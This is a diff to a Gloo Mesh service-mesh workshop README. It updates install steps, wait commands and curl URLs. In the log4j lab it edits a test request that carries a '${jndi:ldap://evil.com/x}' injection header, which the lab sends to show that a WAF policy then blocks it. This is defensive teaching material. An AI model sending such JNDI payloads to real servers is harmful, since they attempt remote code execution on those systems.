@@ -2,6 +2,15 @@
 
 # <center>Gloo Mesh Online Boutique Demo Workshop</center>
 
+## Get Started
+
+To get started with this workshop, checkout out this repo and follow the guide below
+
+```sh
+git clone https://github.com/solo-io/solo-cop.git
+cd workshops/gloo-mesh-demo && git checkout v1.0.0
+```
+
 ## Table of Contents
 
 * [Introduction](#introduction)
@@ -122,7 +131,7 @@ meshctl cluster register \
 
 ** Problems? ** meshctl tries to automatically detect the management server endpoint, but sometimes this can fail. If that happens, it can be supplied manually. Follow the steps [here](problems-manual-registration.md) if you run into this.
 
-4. Verify proper installation by opening the Gloo Mesh UI by running `meshctl dashboard`. Click [here](problems-dashboard.md) if that command did not work. 
+4. Verify proper installation by opening the Gloo Mesh UI by running `meshctl dashboard`. Click [here](problems-dashboard.md) if that command did not work. **Its best to run this command in a separate terminal.**
 
 ```sh
 meshctl dashboard
@@ -160,13 +169,13 @@ istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --co
 1. Deploy the Online Boutique backend APIs to `cluster1` in the `backend-apis` namespace.
 
 ```sh
-kubectl apply --context $CLUSTER1 -f https://raw.githubusercontent.com/solo-io/solo-cop/workshop/workshops/gloo-mesh-demo/install/online-boutique/backend-apis.yaml
+kubectl apply --context $CLUSTER1 -f install/online-boutique/backend-apis.yaml
 ```
 
 2. Deploy the frontend UI to the `web-ui` namespace in `cluster1`.
 
 ```sh
-kubectl apply --context $CLUSTER1 -f https://raw.githubusercontent.com/solo-io/solo-cop/workshop/workshops/gloo-mesh-demo/install/online-boutique/web-ui.yaml
+kubectl apply --context $CLUSTER1 -f install/online-boutique/web-ui.yaml
 ```
 
 ## Lab 5 - Configure Gloo Mesh Workspaces <a name="Lab-5"></a>
@@ -470,6 +479,8 @@ EOF
 
 ```sh
 kubectl apply --context $CLUSTER1 -f install/online-boutique/web-ui-with-checkout.yaml
+sleep 5
+kubectl wait pod -l app=frontend -n web-ui --context $CLUSTER1 --for condition=ready
 ```
 
 4. Try and buy some items. You should see an error. 
@@ -745,7 +756,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a bad JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://${HTTP_GATEWAY_ENDPOINT}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
 ```
 
 **WAF policy**
@@ -810,7 +821,7 @@ EOF
 4. Try the request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://${HTTP_GATEWAY_ENDPOINT}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT
 ```
 
 Note that the is now blocked with the custom intervention message from the WAF policy.
@@ -919,7 +930,7 @@ EOF
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET http://${HTTP_GATEWAY_ENDPOINT}/ | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET http://$HTTP_GATEWAY_ENDPOINT | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
